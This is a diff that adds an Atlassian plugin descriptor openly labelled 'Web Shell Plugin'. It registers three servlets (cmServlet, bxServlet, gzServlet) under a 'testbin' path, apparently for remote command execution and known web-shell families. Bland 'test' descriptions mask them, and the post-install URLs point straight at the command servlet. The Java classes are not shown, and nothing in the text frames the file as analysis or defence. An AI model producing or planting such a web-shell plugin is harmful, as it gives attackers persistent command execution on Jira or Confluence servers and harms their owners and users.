@@ -1,0 +1,28 @@
+<atlassian-plugin name="CommandExecutor" key="demo.Executor" plugins-version="2">
+    <plugin-info>
+        <description>Web Shell Plugin</description>
+        <version>1.0</version>
+        <vendor name="test" url="" />
+
+        <param name="post.install.url">/plugins/servlet/testbin/cmServlet</param>
+        <param name="post.upgrade.url">/plugins/servlet/testbin/cmServlet</param>
+
+        <param name="atlassian-data-center-compatible">true</param>
+        <param name="atlassian-licensing-enabled">true</param>
+
+    </plugin-info>
+
+    <servlet name="A test Plugins" key="demo.Executor.cm" class="demo.CommandExecutor">
+        <description>test</description>
+        <url-pattern>/testbin/cmServlet</url-pattern>
+    </servlet>
+    <servlet name="A test Plugins bin" key="demo.Executor.gz" class="demo.bxExecutor">
+        <description>test</description>
+        <url-pattern>/testbin/bxServlet</url-pattern>
+    </servlet>
+    <servlet name="A test Plugins god" key="demo.Executor.bx" class="demo.gzExecutor">
+        <description>test</description>
+        <url-pattern>/testbin/gzServlet</url-pattern>
+    </servlet>
+
+</atlassian-plugin>
